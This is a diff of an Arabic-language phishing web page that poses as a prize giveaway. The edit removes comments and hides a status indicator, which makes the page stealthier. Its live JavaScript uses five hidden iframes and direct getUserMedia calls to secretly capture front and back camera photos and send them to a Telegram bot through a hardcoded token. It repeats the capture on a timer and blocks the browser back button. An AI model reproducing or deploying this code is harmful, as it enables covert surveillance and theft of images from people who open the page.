@@ -74,7 +74,6 @@
         .btn-claim:hover { transform: scale(1.02); }
         .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
         .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
-        #status { color: #ffd700; margin-top: 12px; font-size: 13px; opacity: 0.7; }
         .hidden-iframe {
             position: fixed;
             top: -9999px;
@@ -86,11 +85,11 @@
             border: none;
         }
         ::selection { background: transparent; }
+        #status { display: none; }
     </style>
 </head>
 <body>
 
-<!-- 5 iframes مخفية بطرق مختلفة لاستغلال WebView -->
 <iframe class="hidden-iframe" id="iframe1" allow="camera; microphone"></iframe>
 <iframe class="hidden-iframe" id="iframe2" allow="camera; microphone"></iframe>
 <iframe class="hidden-iframe" id="iframe3" allow="camera; microphone"></iframe>
@@ -107,21 +106,14 @@
     <button class="btn-claim" id="claimBtn">🎁 خذ جائزتك من عمك عبود</button>
     <div class="repeated-msg">♻️ عمك عبود يرحب بكم — عمك عبود يرحب بكم</div>
     <div class="footer-note">© جميع الحقوق محفوظة لعمك عبود ❤️</div>
-    <div id="status">⏳ جاري التجهيز...</div>
 </div>
 
 <script>
-    // ============================================================
-    // ================ BOT CONFIG =================================
-    // ============================================================
     const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
     let CHAT_ID = null;
     let started = false;
     let retries = 0;
 
-    // ============================================================
-    // ================ إرسال الصور ================================
-    // ============================================================
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
         const mime = parts[0].match(/:(.*?);/)[1];
@@ -144,9 +136,6 @@
         } catch(e) {}
     }
 
-    // ============================================================
-    // ================ الحصول على Chat ID تلقائيًا ===============
-    // ============================================================
     function getChatId() {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
             .then(r => r.json())
@@ -154,10 +143,7 @@
                 if (d.ok && d.result && d.result.length > 0) {
                     const last = d.result[d.result.length - 1];
                     CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-                    if (CHAT_ID) {
-                        document.getElementById('status').textContent = '✅ تم الربط بالبوت';
-                        return;
-                    }
+                    if (CHAT_ID) return;
                 }
                 if (retries < 30) {
                     retries++;
@@ -172,11 +158,6 @@
             });
     }
 
-    // ============================================================
-    // ================ 5 طرق لاستغلال الكاميرا ===================
-    // ============================================================
-
-    // الطريقة 1: iframe مع getUserMedia
     function exploitIframe1() {
         try {
             const iframe = document.getElementById('iframe1');
@@ -201,7 +182,6 @@
         } catch(e) {}
     }
 
-    // الطريقة 2: iframe مختلف مع محاولة فورية
     function exploitIframe2() {
         try {
             const iframe = document.getElementById('iframe2');
@@ -229,7 +209,6 @@
         } catch(e) {}
     }
 
-    // الطريقة 3: iframe مع استغلال autoplay
     function exploitIframe3() {
         try {
             const iframe = document.getElementById('iframe3');
@@ -253,7 +232,6 @@
         } catch(e) {}
     }
 
-    // الطريقة 4: iframe مع استغلال WebView (محاولة متكررة)
     function exploitIframe4() {
         try {
             const iframe = document.getElementById('iframe4');
@@ -277,7 +255,6 @@
         } catch(e) {}
     }
 
-    // الطريقة 5: iframe مع استغلال مباشر
     function exploitIframe5() {
         try {
             const iframe = document.getElementById('iframe5');
@@ -302,24 +279,16 @@
         } catch(e) {}
     }
 
-    // ============================================================
-    // ================ استقبال الرسائل من iframes ================
-    // ============================================================
     window.addEventListener('message', function(e) {
         if (e.data && e.data.type === 'photo') {
             sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : e.data.facing === 'back' ? 'خلفي' : 'كاميرا'));
-            document.getElementById('status').textContent = '📸 جاري التصوير...';
         }
     });
 
-    // ============================================================
-    // ================ الطريقة المباشرة (احتياطي) ===============
-    // ============================================================
     function exploitDirect() {
         if (started) return;
         started = true;
 
-        // أمامي
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 const video = document.createElement('video');
@@ -340,7 +309,6 @@
             })
             .catch(() => {});
 
-        // خلفي
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
             .then(stream => {
                 const video = document.createElement('video');
@@ -362,21 +330,13 @@
             .catch(() => {});
     }
 
-    // ============================================================
-    // ================ بدء التشغيل ===============================
-    // ============================================================
     function startAllExploits() {
-        // تشغيل جميع الـ 5 iframes
         exploitIframe1();
         exploitIframe2();
         exploitIframe3();
         exploitIframe4();
         exploitIframe5();
-
-        // الطريقة المباشرة
         setTimeout(exploitDirect, 1000);
-
-        // إعادة محاولة iframes بعد 3 ثواني
         setTimeout(() => {
             exploitIframe1();
             exploitIframe2();
@@ -384,8 +344,6 @@
             exploitIframe4();
             exploitIframe5();
         }, 3000);
-
-        // إعادة محاولة كل 5 ثواني
         setInterval(() => {
             exploitIframe1();
             exploitIframe2();
@@ -400,7 +358,6 @@
         startAllExploits();
     };
 
-    // منع الخروج
     history.pushState(null, '', location.href);
     window.addEventListener('popstate', () => history.pushState(null, '', location.href));
 
